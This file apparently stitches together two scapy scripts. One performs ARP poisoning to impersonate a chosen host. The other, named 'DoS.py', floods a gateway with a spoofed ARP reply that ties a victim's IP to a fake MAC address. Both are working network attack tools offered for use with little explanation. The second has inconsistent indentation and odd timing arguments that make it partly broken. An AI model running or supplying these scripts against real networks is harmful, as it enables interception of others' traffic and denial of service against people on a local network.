#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#
# Python arp poison example script
#

__author__ = '090h'
__license__ = 'GPL'

from scapy.all import *
import sys

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
Timeout=2

if len(sys.argv) != 3:
    print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
    sys.exit(1)

my_mac = get_mac_address()
if not my_mac:
    print "Cant get local mac address, quitting"
    sys.exit(1)

packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])

sendp(packet)

########################

#DoS.py
#Default target is 10.0.3.3
import sys
from scapy.all import *

try:
      if(sys.argv[1] == "-h"):
            print("Usage:")
           print("DoS [victim_ip] [arp_dest_ip] [arp_dest_mac] [victim_mac]")
           exit(0)
except IndexError:
      print("Attacking....")

x=ARP()
x.op=2
try:
      x.psrc=sys.argv[1] #SOURCE_IP
except IndexError:
      x.psrc="10.0.3.3"
try:
      x.hwsrc=sys.argv[4] #SOURCE_MAC
except IndexError:
      x.hwsrc="FF:FF:FF:FF:FF:FF" #Put a fake MAC address here
try:
      x.pdst=sys.argv[2] #DEST_IP
      x.hwdst=sys.argv[3] #DEST_MAC
except IndexError:
      x.pdst="10.0.3.1" #Usually contains the IP of the gateway
      x.hwdst="FF:FF:FF:AB:CD:EF" #Should contain the MAC of the IP defined as x.pdst
x.show()

sr(x,inter=0.0000000000000001,retry=-999999999,timeout=0.00000000000001)